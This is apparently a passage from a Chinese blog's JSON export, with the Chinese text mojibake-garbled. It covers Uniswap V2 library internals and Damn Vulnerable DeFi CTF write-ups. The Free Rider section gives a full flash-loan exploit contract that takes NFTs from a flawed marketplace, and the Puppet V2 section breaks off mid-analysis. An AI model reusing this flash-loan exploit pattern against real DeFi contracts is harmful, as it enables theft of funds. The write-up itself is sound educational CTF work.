ETH é‡‘é¢ä¹Ÿæ˜¯ç›´æ¥ä» msg.value è¯»å–çš„ï¼Œæ‰€ä»¥å…¥å‚é‡Œä¹Ÿä¸éœ€è¦ ETH çš„ Desired å‚æ•°ã€‚ä½†æ˜¯ä¼šå®šä¹‰ amountETHMin è¡¨ç¤ºæ„¿æ„æ¥å—æˆäº¤çš„ ETH æœ€å°é¢ã€‚ å®ç°é€»è¾‘ä¸Šï¼Œè¯·æ³¨æ„ï¼Œè°ƒç”¨ _addLiquidity æ—¶ä¼ å…¥çš„ç¬¬äºŒä¸ªå‚æ•°æ˜¯ WETHã€‚å…¶å®ï¼ŒaddLiquidityETH å®é™…ä¸Šä¹Ÿæ˜¯å°† ETH è½¬ä¸º WETH è¿›è¡Œå¤„ç†çš„ã€‚å¯ä»¥çœ‹åˆ°ä»£ç ä¸­è¿˜æœ‰è¿™ä¹ˆä¸€è¡Œï¼š 1IWETH(WETH).deposit&#123;value: amountETH&#125;(); è¿™å°±æ˜¯å°†ç”¨æˆ·è½¬å…¥çš„ ETH è½¬æˆäº† WETHã€‚ è€Œæœ€åä¸€è¡Œä»£ç åˆ™ä¼šåˆ¤æ–­ï¼Œå¦‚æœä¸€å¼€å§‹æ”¯ä»˜çš„ msg.value å¤§äºå®é™…éœ€è¦æ”¯ä»˜çš„é‡‘é¢ï¼Œå¤šä½™çš„éƒ¨åˆ†å°†è¿”è¿˜ç»™ç”¨æˆ· Library1. UniswapV2Library ä»£ç è§£è¯»å¦‚ä¸‹ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122pragma solidity &gt;=0.5.0;import &#x27;@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol&#x27;;import &quot;./SafeMath.sol&quot;;library UniswapV2Library &#123; using SafeMath for uint; // returns sorted token addresses, used to handle return values from pairs sorted in this order // ç»™ tokenAå’ŒtokenBæ’åºï¼ŒæŒ‰å­—é¢å€¼æ’åº function sortTokens(address tokenA, address tokenB) internal pure returns (address token0, address token1) &#123; require(tokenA != tokenB, &#x27;UniswapV2Library: IDENTICAL_ADDRESSES&#x27;); (token0, token1) = tokenA &lt; tokenB ? (tokenA, tokenB) : (tokenB, tokenA); require(token0 != address(0), &#x27;UniswapV2Library: ZERO_ADDRESS&#x27;); &#125; // calculates the CREATE2 address for a pair without making any external calls // è¾“å…¥å·¥å‚åœ°å€å’Œä¸¤ä¸ªä»£å¸åœ°å€ï¼Œè®¡ç®—è¿™ä¸¤ä¸ªä»£å¸çš„äº¤æ˜“å¯¹åœ°å€ function pairFor(address factory, address tokenA, address tokenB) internal pure returns (address pair) &#123; // å…ˆå¯¹è¿™ä¸¤ä¸ªä»£å¸åœ°å€è¿›è¡Œæ’åº (address token0, address token1) = sortTokens(tokenA, tokenB); // é‡‡ç”¨create2çš„æ–¹å¼è®¡ç®—åœ°å€ pair = address(uint(keccak256(abi.encodePacked( hex&#x27;ff&#x27;, factory, keccak256(abi.encodePacked(token0, token1)), // UniswapV2Pair åˆçº¦çš„ creationCode çš„å“ˆå¸Œå€¼ hex&#x27;96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f&#x27; // init code hash )))); &#125; // fetches and sorts the reserves for a pair function getReserves(address factory, address tokenA, address tokenB) internal view returns (uint reserveA, uint reserveB) &#123; // å…ˆè®© tokenA å’Œ tokenB ä»å°åˆ°å¤§æ’åˆ— (address token0,) = sortTokens(tokenA, tokenB); // æ ¹æ® `pairFor(factory, tokenA, tokenB)`ç®—å‡ºä¸€ä¸ªæ–°çš„åœ°å€ // .getReserves() è·å– è¯¥æ–°åœ°å€çš„ reserve0ï¼Œreserve1 (uint reserve0, uint reserve1,) = IUniswapV2Pair(pairFor(factory, tokenA, tokenB)).getReserves(); // å¦‚æœäº¤æ¢è¿‡é¡ºåºå°±äº¤æ¢è¾“å‡ºï¼Œç®€å•æ¥è¯´åŠæ—¶ä¸ºäº†å¯¹åº”è¾“å…¥çš„å½¢å‚ (reserveA, reserveB) = tokenA == token0 ? (reserve0, reserve1) : (reserve1, reserve0); &#125; // given some amount of an asset and pair reserves, returns an equivalent amount of the other asset /** æ•°é‡ä¸ºamountAçš„ä»£å¸Aï¼ŒæŒ‰ç…§åˆçº¦ä¸­ä¸¤ç§ä»£å¸ä½™é¢æ¯”ä¾‹ï¼Œæ¢ç®—æˆå¦ä¸€ä¸ªä»£å¸Bã€‚æ­¤æ—¶ä¸è€ƒè™‘æ‰‹ç»­è´¹ï¼Œå› ä¸ºä»…æ˜¯è®¡ä»·å•ä½çš„æ¢ç®— ã€æ ¹æ®ç»™å®šçš„ä¸¤ä¸ª token çš„å‚¨å¤‡é‡å’Œå…¶ä¸­ä¸€ä¸ª token æ•°é‡ï¼Œè®¡ç®—å¾—åˆ°å¦ä¸€ä¸ª token ç­‰å€¼çš„æ•°å€¼ã€‘ */ function quote(uint amountA, uint reserveA, uint reserveB) internal pure returns (uint amountB) &#123; require(amountA &gt; 0, &#x27;UniswapV2Library: INSUFFICIENT_AMOUNT&#x27;); require(reserveA &gt; 0 &amp;&amp; reserveB &gt; 0, &#x27;UniswapV2Library: INSUFFICIENT_LIQUIDITY&#x27;); amountB = amountA.mul(reserveB) / reserveA; &#125; // given an input amount of an asset and pair reserves, returns the maximum output amount of the other asset /** è¯¥æ–¹æ³•è®¡ç®—ï¼šè¾“å…¥ä¸€å®šæ•°é‡ï¼ˆamountInï¼‰ä»£å¸Aï¼Œæ ¹æ®æ± å­ä¸­ä»£å¸ä½™é¢ï¼Œèƒ½å¾—åˆ°å¤šå°‘æ•°é‡ï¼ˆamountOutï¼‰ä»£å¸Bã€‚ amountInæŒ‡è¾“å…¥çš„ä»£å¸Aï¼ŒreserveIn æŒ‡ä»£å¸Açš„å­˜å‚¨é‡ï¼ŒreserveOutæŒ‡ä»£å¸Bçš„å­˜å‚¨é‡ ã€æ ¹æ®ç»™å®šçš„ä¸¤ä¸ª token çš„å‚¨å¤‡é‡å’Œè¾“å…¥çš„ token æ•°é‡ï¼Œè®¡ç®—å¾—åˆ°è¾“å‡ºçš„ token æ•°é‡ï¼Œè¯¥è®¡ç®—ä¼šæ‰£å‡æ‰ 0.3% çš„æ‰‹ç»­è´¹ã€‘ */ function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) internal pure returns (uint amountOut) &#123; require(amountIn &gt; 0, &#x27;UniswapV2Library: INSUFFICIENT_INPUT_AMOUNT&#x27;); require(reserveIn &gt; 0 &amp;&amp; reserveOut &gt; 0, &#x27;UniswapV2Library: INSUFFICIENT_LIQUIDITY&#x27;); uint amountInWithFee = amountIn.mul(997); uint numerator = amountInWithFee.mul(reserveOut); uint denominator = reserveIn.mul(1000).add(amountInWithFee); amountOut = numerator / denominator; &#125; // given an output amount of an asset and pair reserves, returns a required input amount of the other asset /** è¯¥æ–¹æ³•è®¡ç®—å½“å¸Œæœ›è·å¾—ä¸€å®šæ•°é‡ï¼ˆamountOutï¼‰çš„ä»£å¸Bæ—¶ï¼Œåº”è¯¥è¾“å…¥å¤šå°‘æ•°é‡ï¼ˆamoutnInï¼‰çš„ä»£å¸Aã€‚ amountOutæŒ‡è¦å¾—åˆ°çš„ä»£å¸Bï¼ŒreserveIn æŒ‡ä»£å¸Açš„å­˜å‚¨é‡ï¼ŒreserveOutæŒ‡ä»£å¸Bçš„å­˜å‚¨é‡ ã€æ ¹æ®ç»™å®šçš„ä¸¤ä¸ª token çš„å‚¨å¤‡é‡å’Œè¾“å‡ºçš„ token æ•°é‡ï¼Œè®¡ç®—å¾—åˆ°è¾“å…¥çš„ token æ•°é‡ï¼Œè¯¥è®¡ç®—ä¼šæ‰£å‡æ‰ 0.3% çš„æ‰‹ç»­è´¹ã€‘ */ function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) internal pure returns (uint amountIn) &#123; require(amountOut &gt; 0, &#x27;UniswapV2Library: INSUFFICIENT_OUTPUT_AMOUNT&#x27;); require(reserveIn &gt; 0 &amp;&amp; reserveOut &gt; 0, &#x27;UniswapV2Library: INSUFFICIENT_LIQUIDITY&#x27;); uint numerator = reserveIn.mul(amountOut).mul(1000); uint denominator = reserveOut.sub(amountOut).mul(997); amountIn = (numerator / denominator).add(1); &#125; // performs chained getAmountOut calculations on any number of pairs /** è¯¥æ–¹æ³•ç”¨äºè®¡ç®—åœ¨ä½¿ç”¨å¤šä¸ªäº¤æ˜“å¯¹æ—¶ï¼Œè¾“å…¥ä¸€å®šæ•°é‡ï¼ˆamountInï¼‰çš„ç¬¬ä¸€ç§ä»£å¸ï¼Œ æœ€ç»ˆèƒ½æ”¶åˆ°å¤šå°‘æ•°é‡çš„æœ€åä¸€ç§ä»£å¸ï¼ˆamountsï¼‰ã€‚amountsæ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ è¡¨ç¤ºamountInï¼Œ æœ€åä¸€ä¸ªå…ƒç´ è¡¨ç¤ºè¯¥ç›®æ ‡ä»£å¸å¯¹åº”çš„æ•°é‡ã€‚è¯¥æ–¹æ³•å®é™…ä¸Šæ˜¯å¾ªç¯è°ƒç”¨getAmountInæ–¹æ³•ã€‚ ã€æ ¹æ®å…‘æ¢è·¯å¾„å’Œè¾“å…¥æ•°é‡ï¼Œè®¡ç®—å¾—åˆ°å…‘æ¢è·¯å¾„ä¸­æ¯ä¸ªäº¤æ˜“å¯¹çš„è¾“å‡ºæ•°é‡ã€‘ */ function getAmountsOut(address factory, uint amountIn, address[] memory path) internal view returns (uint[] memory amounts) &#123; require(path.length &gt;= 2, &#x27;UniswapV2Library: INVALID_PATH&#x27;); // åˆ›å»ºä¸€ä¸ªå’Œpathç­‰é•¿çš„uintæ•°ç»„ amounts = new uint[](path.length); amounts[0] = amountIn; for (uint i; i &lt; path.length - 1; i++) &#123; (uint reserveIn, uint reserveOut) = getReserves(factory, path[i], path[i + 1]); amounts[i + 1] = getAmountOut(amounts[i], reserveIn, reserveOut); &#125; &#125; // performs chained getAmountIn calculations on any number of pairs /** ä¸getAmountsOutç›¸å¯¹ï¼ŒgetAmountsInç”¨äºè®¡ç®—å½“å¸Œæœ›æ”¶åˆ°ä¸€å®šæ•°é‡ï¼ˆamountOutï¼‰çš„ç›®æ ‡ä»£å¸ï¼Œ åº”è¯¥åˆ†åˆ«è¾“å…¥å¤šå°‘æ•°é‡çš„ä¸­é—´ä»£å¸ã€‚è®¡ç®—æ–¹æ³•ä¹Ÿæ˜¯å¾ªç¯è°ƒç”¨getAmountInã€‚ */ function getAmountsIn(address factory, uint amountOut, address[] memory path) internal view returns (uint[] memory amounts) &#123; require(path.length &gt;= 2, &#x27;UniswapV2Library: INVALID_PATH&#x27;); amounts = new uint[](path.length); amounts[amounts.length - 1] = amountOut; for (uint i = path.length - 1; i &gt; 0; i--) &#123; (uint reserveIn, uint reserveOut) = getReserves(factory, path[i - 1], path[i]); amounts[i - 1] = getAmountIn(amounts[i], reserveIn, reserveOut); &#125; &#125;&#125; getAmountOut çš„å®ç°ï¼š æ ¹æ® AMM çš„åŸç†ï¼Œæ’å®šä¹˜ç§¯å…¬å¼ã€Œx * y &#x3D; Kã€ï¼Œå…‘æ¢å‰å K å€¼ä¸å˜ã€‚å› æ­¤ï¼Œåœ¨ä¸è€ƒè™‘äº¤æ˜“æ‰‹ç»­è´¹çš„æƒ…å†µä¸‹ï¼Œä»¥ä¸‹å…¬å¼ä¼šæˆç«‹ï¼š 1reserveIn * reserveOut = (reserveIn + amountIn) * (reserveOut - amountOut) å°†å…¬å¼å³è¾¹çš„è¡¨è¾¾å¼å±•å¼€ï¼Œå¹¶æ¨å¯¼ä¸‹ï¼Œå°±å˜æˆäº†ï¼š 12345reserveIn * reserveOut = reserveIn * reserveOut + amountIn * reserveOut - (reserveIn + amountIn) * amountOut-&gt;amountIn * reserveOut = (reserveIn + amountIn) * amountOut-&gt;amountOut = amountIn * reserveOut / (reserveIn + amountIn) è€Œå®é™…ä¸Šäº¤æ˜“æ—¶ï¼Œè¿˜éœ€è¦æ‰£å‡åƒåˆ†ä¹‹ä¸‰çš„äº¤æ˜“æ‰‹ç»­è´¹ï¼Œæ‰€ä»¥å®é™…ä¸Šï¼š 1amountIn = amountIn * 997 / 1000 ä»£å…¥ä¸Šé¢çš„å…¬å¼åï¼Œæœ€ç»ˆç»“æœå°±å˜æˆäº†ï¼š 12345amountOut = (amountIn * 997 / 1000) * reserverOut / (reserveIn + amountIn * 997 / 1000)-&gt;amountOut = amountIn * 997 * reserveOut / 1000 * (reserveIn + amountIn * 997 / 1000)-&gt;amountOut = amountIn * 997 * reserveOut / (reserveIn * 1000 + amountIn * 997) è¿™å³æ˜¯æœ€åä»£ç å®ç°ä¸­çš„è®¡ç®—å…¬å¼äº†ã€‚ è§£è¯»getAmountsOut æ ¹æ®å…‘æ¢è·¯å¾„å’Œè¾“å…¥æ•°é‡ï¼Œè®¡ç®—å¾—åˆ°å…‘æ¢è·¯å¾„ä¸­æ¯ä¸ªäº¤æ˜“å¯¹çš„è¾“å‡ºæ•°é‡ã€‚ ä¸¾ä¾‹ï¼š å‡å¦‚ä¸€ä¸ªäº¤æ˜“åœ°å€æ•°ç»„ path[A,B,C,D] ï¼Œå…¶ä¸­ pair(A,B)ä¸­çš„tokenA&#x3D;6ï¼ŒtokenB&#x3D;9ï¼› pair(B,C)ä¸­çš„tokenA&#x3D;10ï¼ŒtokenB&#x3D;8ï¼› pair(C,D)ä¸­çš„tokenA&#x3D;19ï¼ŒtokenB&#x3D;84 åˆ™ amounts[0] &#x3D; IN_tokenA, pair(A,B) : amount[1] &#x3D; getAmountOut(IN_tokenA, reserveA, reserveB), pair(B,C): amount[2] &#x3D; getAmountOut(IN_tokenA, reserveA, reserveB), pair(C,D): amount[3] &#x3D; getAmountOut(IN_tokenA, reserveA, reserveB). è¯¥å‡½æ•°ä¼šè®¡ç®— path ä¸­æ¯ä¸€ä¸ªä¸­é—´èµ„äº§å’Œæœ€ç»ˆèµ„äº§çš„æ•°é‡ï¼Œæ¯”å¦‚ path ä¸º [A,B,C]ï¼Œåˆ™ä¼šå…ˆå°† A å…‘æ¢æˆ Bï¼Œå†å°† B å…‘æ¢æˆ Cã€‚è¿”å›å€¼åˆ™æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œç¬¬ä¸€ä¸ªå…ƒç´ æ˜¯ A çš„æ•°é‡ï¼Œå³ amountInï¼Œè€Œç¬¬äºŒä¸ªå…ƒç´ åˆ™æ˜¯å…‘æ¢åˆ°çš„ä»£å¸ B çš„æ•°é‡ï¼Œæœ€åä¸€ä¸ªå…ƒç´ åˆ™æ˜¯æœ€ç»ˆè¦å…‘æ¢å¾—åˆ°çš„ä»£å¸ C çš„æ•°é‡ã€‚ ä»ä»£ç ä¸­è¿˜å¯çœ‹åˆ°ï¼Œæ¯ä¸€æ¬¡å…‘æ¢å…¶å®éƒ½è°ƒç”¨äº† getAmountOut å‡½æ•°ï¼Œè¿™ä¹Ÿæ„å‘³ç€æ¯ä¸€æ¬¡ä¸­é—´å…‘æ¢éƒ½ä¼šæ‰£å‡åƒåˆ†ä¹‹ä¸‰çš„äº¤æ˜“æ‰‹ç»­è´¹ã€‚é‚£å¦‚æœå…‘æ¢ä¸¤æ¬¡ï¼Œå®é™…æ”¯ä»˜å‡è®¾ä¸º 1000ï¼Œé‚£æœ€ç»ˆå®é™…å…‘æ¢å¾—åˆ°çš„ä»·å€¼åªå‰©ä¸‹ï¼š 11000 * (1 - 0.003) * (1 - 0.003) = 994.009 å³å®é™…æ”¯ä»˜çš„äº¤æ˜“æ‰‹ç»­è´¹å°†è¿‘åƒåˆ†ä¹‹å…­äº†ã€‚å…‘æ¢è·¯å¾„è¶Šé•¿ï¼Œå®é™…æ‰£å‡çš„äº¤æ˜“æ‰‹ç»­è´¹ä¼šæ›´å¤šï¼Œæ‰€ä»¥å…‘æ¢è·¯å¾„ä¸€èˆ¬ä¸å®œè¿‡é•¿ã€‚ getAmountsInåŒç† å‚è€ƒé“¾æ¥uniswap v2ç™½çš®ä¹¦ é“¾æ¥1 uniswap v2ä»£ç  é“¾æ¥2 uiniswap v2ä»£ç coreä»£ç è§£è¯» é“¾æ¥3 ç™»é“¾ç¤¾åŒº","categories":[{"name":"DEFI","slug":"DEFI","permalink":"https://biyouqiuqiu.com/categories/DEFI/"},{"name":"uniswap","slug":"DEFI/uniswap","permalink":"https://biyouqiuqiu.com/categories/DEFI/uniswap/"}],"tags":[{"name":"uniswap v2","slug":"uniswap-v2","permalink":"https://biyouqiuqiu.com/tags/uniswap-v2/"}]},{"title":"Free Rider","slug":"CTFS/damn defi/Free Rider","date":"2023-07-14T15:37:10.000Z","updated":"2023-07-14T15:37:10.000Z","comments":true,"path":"2023/07/14/CTFS/damn defi/Free Rider/","link":"","permalink":"https://biyouqiuqiu.com/2023/07/14/CTFS/damn%20defi/Free%20Rider/","excerpt":"","text":"1. issue A new marketplace of Damn Valuable NFTs has been released! Thereâ€™s been an initial mint of 6 NFTs, which are available for sale in the marketplace. Each one at 15 ETH. The developers behind it have been notified the marketplace is vulnerable. All tokens can be taken. Yet they have absolutely no idea how to do it. So theyâ€™re offering a bounty of 45 ETH for whoever is willing to take the NFTs out and send them their way. Youâ€™ve agreed to help. Although, you only have 0.1 ETH in balance. The devs just wonâ€™t reply to your messages asking for more. If only you could get free ETH, at least for an instant. ç›®æ ‡ï¼šå°†æ‰€æœ‰çš„ NFT å½’è¿˜åˆ°å–å®¶æ‰‹é‡Œï¼Œè·å–èµé‡‘ é¢˜ç›®é“¾æ¥ 2. analysingæœ¬æ¬¡æŒ‘æˆ˜è¦æ±‚ç©å®¶æœ‰ä¸€å®šçš„ ERC721 å’Œ uniswap v2 åŸºç¡€ã€‚ 2.1 FreeRiderNFTMarketplace.solå¦‚æœå¯¹ ERC721 çš„æ¯ä¸€ä¸ªå‡½æ•°éƒ½æ¯”è¾ƒæ¸…æ¥šçš„è¯ï¼Œä¸éš¾çœ‹å‡ºåœ¨ _buyOne å‡½æ•°ä¸­æœ‰ä¸€ä¸ªæ˜æ˜¾çš„æ¼æ´ã€‚ 123456789101112131415161718192021222324252627282930function _buyOne(uint256 tokenId) private &#123; uint256 priceToPay = offers[tokenId]; if (priceToPay == 0) revert TokenNotOffered(tokenId); if (msg.value &lt; priceToPay) revert InsufficientPayment(); --offersCount; // transfer from seller to buyer DamnValuableNFT _token = token; // cache for gas savings /** 1. åœ¨ ERC721 ä¸­çš„balanceæ˜¯è´§å¸çš„ç§ç±» 2. _transfer(address from, address to, uint256 tokenId) å‡½æ•°æ‰§è¡Œä¹‹åå°±ä¼šå°† tokenIdçš„æ‰€æœ‰æƒè½¬äº¤ç»™ to 3. æ­¤æ—¶æ‰§è¡Œ _token.safeTransferFrom(_token.ownerOf(tokenId), msg.sender, tokenId)ä¹‹åï¼Œ msg.sender å°±æˆä¸ºäº†è¯¥ tokenIdçš„æ‰€æœ‰è€… */ _token.safeTransferFrom(_token.ownerOf(tokenId), msg.sender, tokenId); // pay seller using cached token /** 1. è¿™è¡Œä»£ç çš„æ„æ€å°±æ˜¯ msg.sender å‘ _token.ownerOf(tokenId) è¯¥tokenIdçš„æ‰€æœ‰è€…æ”¯ä»˜è´¹ç”¨priceToPay 2. ä¸éš¾çœ‹å‡ºåœ¨ ä¸Šä¸€è¡Œä»£ç ä¸­ï¼Œå–å®¶å·²ç»æŠŠtokenIdå…ˆè¡Œå–ç»™æˆ‘äº†ï¼Œæˆ‘å·²ç»æˆä¸ºäº†è¯¥tokenIdçš„ä¸»äºº 3. æ‰€æœ‰è¿™å°±æ˜¯è‡ªå·±ç»™è‡ªå·±æ”¯ä»˜priceToPayçš„ETHï¼Œç®€ç›´å¤ªç¦»è°± */ payable(_token.ownerOf(tokenId)).sendValue(priceToPay); emit NFTBought(msg.sender, tokenId, priceToPay);&#125; å½’æ ¹ç»“åº•ï¼Œæˆ‘ä»¬çŸ¥é“äº†å¯ä»¥å…è´¹è´­ä¹° NTFï¼Œä½†é¦–å…ˆæˆ‘ä»¬å¾—æœ‰ 15 ETHæ‰è¡Œï¼Œé¢˜ä¸­æˆ‘ä»¬åªæœ‰ 0.1 ETHã€‚ ä½†æ˜¯æˆ‘ä»¬å¯ä»¥ä» uniswap v2ä¸­é€šè¿‡é—ªç”µè´·è·å–è¶³å¤Ÿçš„ ETH. 1234567891011121314/** æ€è·¯ï¼š 1. è¦é€šè¿‡ uniswapPair ä¸­çš„swapå‡½æ•°å€Ÿè´· 15 WETH ç”¨äºè´­ä¹°NFT 1.1 æ±‚å‡º buymany åŠå…¶å‚æ•°çš„ abi.encodeWithSignature(signatureString, arg); 1.2 å°† 15 WETH è½¬åŒ–æˆ 15ETH, IWETH 1.3 éœ€è¦æœ‰ receiveå‡½æ•° 2. hackeréœ€è¦å®ç° IUniswapV2Callee çš„ uniswapV2Call å‡½æ•° 2.1 åœ¨ uniswapV2Call å‡½æ•°ä½“ä¸­è°ƒç”¨ marketplace çš„buyMangå‡½æ•° 2.1.1 åŒæ—¶hackeréœ€è¦å®ç°IERC721Receiveræ¥å£ 2.2 æ‰§è¡Œå®Œ buyMany å‡½æ•°ä¹‹åï¼Œå°† 15ETH è½¬æˆ 15WETH è¿˜ç»™ uniswapPair 2.3 æ­¤æ—¶ hackeræˆä¸ºäº†è¿™ 6ç§ä»£å¸çš„ä¸»äºº 3. é€šè¿‡ ERC721ä¸­çš„ safeTransferFrom å‡½æ•°ï¼Œè·å–èµé‡‘ */ 3. solving3.1 FreeRiderHack.sol123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import &#x27;@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol&#x27;;import &#x27;@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol&#x27;;import &quot;./FreeRiderNFTMarketplace.sol&quot;;import &quot;../DamnValuableToken.sol&quot;;import &quot;../DamnValuableNFT.sol&quot;;import &quot;./FreeRiderRecovery.sol&quot;;import &quot;hardhat/console.sol&quot;;interface IERC20 &#123; function deposit() external payable; function approve(address spender, uint256 amount) external returns (bool); function balanceOf(address account) external returns (uint256); function withdraw(uint256 amount) external; function transfer(address to, uint256 amount) external returns (bool); function transferFrom( address from, address to, uint256 amount ) external returns (bool);&#125;contract FreeRiderHack is IUniswapV2Callee, IERC721Receiver&#123; IUniswapV2Pair uniswapPair; DamnValuableToken token; IERC20 weth; DamnValuableNFT nft; FreeRiderNFTMarketplace marketplace; FreeRiderRecovery recovery; uint256[] tokens = [0, 1, 2, 3, 4, 5]; constructor( address _uniswapPair, address _token, address _weth, address _nft, address payable _marketplace, address _recovery ) payable &#123; uniswapPair = IUniswapV2Pair(_uniswapPair); token = DamnValuableToken(_token); weth = IERC20(_weth); nft = DamnValuableNFT(_nft); marketplace = FreeRiderNFTMarketplace(_marketplace); recovery = FreeRiderRecovery(_recovery); &#125; function attack() external payable &#123; // å› ä¸ºä¸ç¡®å®š token å’Œ weth åœ¨pairä¸­çš„é¡ºåºï¼Œæ‰€ä»¥å…ˆåˆ¤æ–­ (uint amount0Out, uint amount1Out) = address(token) &gt; address(weth) ? (uint(15 ether), uint(0 ether)) :(uint(0 ether), uint(15 ether)); uniswapPair.swap( amount0Out, amount1Out, address(this), abi.encodeWithSignature(&quot;buyMany(uint256[])&quot;, tokens)); /** æ­¤æ—¶ hacker æˆä¸ºäº† tokens çš„æ‹¥æœ‰è€…, ä¸”ä¸æ¬  uniswapPairçš„é’± */ // å…‘æ¢èµé‡‘ for (uint256 i = 0; i &lt; tokens.length; i++) &#123; nft.safeTransferFrom( address(this), address(recovery), tokens[i], // æ­¤å¤„ä¸ºäº†å‘¼åº” payable(abi.decode(_data, (address))).sendValue(PRIZE); abi.encode(msg.sender)); &#125; &#125; function uniswapV2Call(address, uint , uint , bytes calldata data) external &#123; // è®°å½•hackeræ‰‹ä¸­çš„ETH --- 15 ether uint amountETH = weth.balanceOf(address(this)); // å°†WETHæ¢æˆETH weth.withdraw(amountETH); // è°ƒç”¨ buyMany å‡½æ•° address(marketplace).call&#123;value: amountETH&#125;(data); // å°†æ‰‹ä¸­çš„ ETHæ¢æˆWETH, å¹¶è¿˜å›å» // woc è¿™é‡Œè¿˜è¦æ”¯ä»˜ 0.3% çš„æ‰‹ç»­è´¹ï¼ï¼ï¼ ä¹Ÿå°±æ˜¯ 0.045 uint repayAmount = amountETH * 1004 / 1000; weth.deposit&#123;value: repayAmount&#125;(); weth.transfer(address(uniswapPair), repayAmount); &#125; function onERC721Received( address , address , uint256 , bytes calldata ) external returns (bytes4)&#123; return IERC721Receiver.onERC721Received.selector; &#125; receive() external payable &#123;&#125;&#125; è¿™é‡Œæˆ‘ä¸çŸ¥é“ä¸ºä»€ä¹ˆæ”¯ä»˜ 0.3%çš„æ‰‹ç»­è´¹ä¸è¡Œï¼Œå¾—éœ€è¦æ”¯ä»˜æ›´å¤šæ‰è¡Œ æˆ‘é€‰æ‹©äº†æ”¯ä»˜ 0.4% uint repayAmount = amountETH * 1004 / 1000; 3.2 challenge.js123456789101112it(&#x27;Execution&#x27;, async function () &#123; /** CODE YOUR SOLUTION HERE */ const hacker = await (await ethers.getContractFactory(&quot;FreeRiderHack&quot;, player)).deploy( uniswapPair.address, token.address, weth.address, nft.address, marketplace.address, devsContract.address ); await hacker.attack();&#125;); è§£é¢˜æˆåŠŸã€‚","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"damn defi","slug":"CTFS/damn-defi","permalink":"https://biyouqiuqiu.com/categories/CTFS/damn-defi/"}],"tags":[{"name":"damn defi","slug":"damn-defi","permalink":"https://biyouqiuqiu.com/tags/damn-defi/"},{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"}]},{"title":"Puppet V2","slug":"CTFS/damn defi/Puppet V2","date":"2023-07-14T07:37:10.000Z","updated":"2023-07-14T07:37:10.000Z","comments":true,"path":"2023/07/14/CTFS/damn defi/Puppet V2/","link":"","permalink":"https://biyouqiuqiu.com/2023/07/14/CTFS/damn%20defi/Puppet%20V2/","excerpt":"","text":"1. issue The developers of the previous pool seem to have learned the lesson. And released a new version! Now theyâ€™re using a Uniswap v2 exchange as a price oracle, along with the recommended utility libraries. That should be enough. You start with 20 ETH and 10000 DVT tokens in balance. The pool has a million DVT tokens in balance. You know what to do. è¦æ±‚ï¼šé€šè¿‡æ‰‹ä¸­çš„ 20 ETH å’Œ 10000 DVT ï¼Œå°†æ± ä¸­çš„ 100ä¸‡ä¸ª DVT ä»£å¸å–å‡ºæ¥ã€‚ é¢˜ç›®é“¾æ¥ 2. analysingåšè¿™é¢˜æ˜¯è¦æ±‚å¯¹ uniswap v2æœ‰ä¸€å®šçš„äº†è§£æ‰è¡Œã€‚ 2.1 PuppetV2Pool.solä»£ç çš„åˆ†æå¦‚ä¸‹ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384// SPDX-License-Identifier: MITpragma solidity ^0.6.0; import &quot;@uniswap/v2-periphery/contracts/libraries/UniswapV2Library.sol&quot;;import &quot;@uniswap/v2-periphery/contracts/libraries/SafeMath.sol&quot;;interface IERC20 &#123; function transfer(address to, uint256 amount) external returns (bool); function transferFrom(address from, address to, uint256 amount) external returns (bool); function balanceOf(address account) external returns (uint256);&#125;/** * @title PuppetV2Pool * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz) */contract PuppetV2Pool &#123; using SafeMath for uint256; address private _uniswapPair; address private _uniswapFactory; IERC20 private _token; IERC20 private _weth; mapping(address =&gt; uint256) public deposits; event Borrowed(address indexed borrower, uint256 depositRequired, uint256 borrowAmount, uint256 timestamp); constructor(address wethAddress, address tokenAddress, address uniswapPairAddress, address uniswapFactoryAddress) public &#123; _weth = IERC20(wethAddress); _token = IERC20(tokenAddress); _uniswapPair = uniswapPairAddress; _uniswapFactory = uniswapFactoryAddress; &#125; /** * @notice Allows borrowing tokens by first depositing three times their value in WETH * Sender must have approved enough WETH in advance. * Calculations assume that WETH and borrowed token have same amount of decimals. */ function borrow(uint256 borrowAmount) external &#123; // Calculate how much WETH the user must deposit // å€Ÿ WETH çš„æŠ¼é‡‘ amount = borrowAmount * 10 ^ 18 * reservesWETH / reservesToken uint256 amount = calculateDepositOfWETHRequired(borrowAmount); // Take the WETH _weth.transferFrom(msg.sender, address(this), amount); // internal accounting deposits[msg.sender] += amount; require(_token.transfer(msg.sender, borrowAmount), &quot;Transfer failed&quot;); emit Borrowed(msg.sender, amount, borrowAmount, block.timestamp); &#125; function calculateDepositOfWETHRequired(uint256 tokenAmount) public view returns (uint256) &#123; uint256 depositFactor = 3; return _getOracleQuote(tokenAmount).mul(depositFactor) / (1 ether); &#125; // Fetch the price from Uniswap v2 using the official libraries function _getOracleQuote(uint256 amount) private view returns (uint256) &#123; /** 1. address(_weth), address(_token) ä¸èƒ½ç›¸åŒ 2. getReserves() è¯¥å‡½æ•°çš„ä½œç”¨å°±æ˜¯ä¸ºäº†æ±‚å‡ºåœ¨ uniswapä¸­å„è‡ªå¯¹åº”çš„å­˜å‚¨é‡ */ (uint256 reservesWETH, uint256 reservesToken) = UniswapV2Library.getReserves(_uniswapFactory, address(_weth), address(_token)); /** 1. amount è¦æ±‚å¤§äº 0 2. reservesTokenï¼ŒreservesWETH ä¹Ÿè¦æ±‚å¤§äº0ï¼Œä¹Ÿå°±æ˜¯è¯´è¦æ±‚åœ¨ 